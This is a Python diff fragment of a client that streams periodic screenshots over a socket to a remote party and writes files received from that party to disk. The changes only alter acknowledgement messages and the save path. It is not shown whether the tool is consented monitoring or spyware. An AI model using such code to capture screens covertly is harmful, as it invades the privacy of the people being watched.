@@ -40,6 +40,7 @@ def get_stream(userid):
 	while True:
 		log('Waiting for data')
 		data = s.recv(300000)
+		s.send("okheader")
 		log('Got data')
 		if not data:
 			log('breaking')
@@ -80,7 +81,7 @@ def get_stream(userid):
 		f = open(os.path.join(folder_path, fname), 'ab')
 		f.write(base64.b64decode(got_encoded))
 		f.close()
-		s.send("ok")
+		s.send("okfile")
 	f.close()
 
 def lockscreen_handler():
@@ -113,7 +114,7 @@ def snap_handler(userid):
 			log('killSnap, breaking')
 			return
 		snapshot = ImageGrab.grab() # TODO Lower quality
-		save_path = "{0}\\MySnapshot_{1}.jpg".format(IMAGE_SAVE_PATH, random.randint(0,99999))
+		save_path = "{0}\\temp\\MySnapshot_{1}.jpg".format(IMAGE_SAVE_PATH, random.randint(0,99999))
 		snapshot.save(save_path)
 		#log('got snap, snapid: ' + str(snapid))
 		# Send
@@ -128,9 +129,9 @@ def snap_handler(userid):
 			encoded_data = base64.b64encode(raw_data)
 			msg = "{0},{1},{2},{3},{4},{5}".format(userid, image_date, image_hour, image_minute, snapid, len(encoded_data))
 			s.send(msg)
-			time.sleep(0.1)
+			s.recv(100)
 			s.send(encoded_data)
-			#time.sleep(0.1)
+			s.recv(100)
 			#log('Sent snap')
 
 		# finish, remove the file
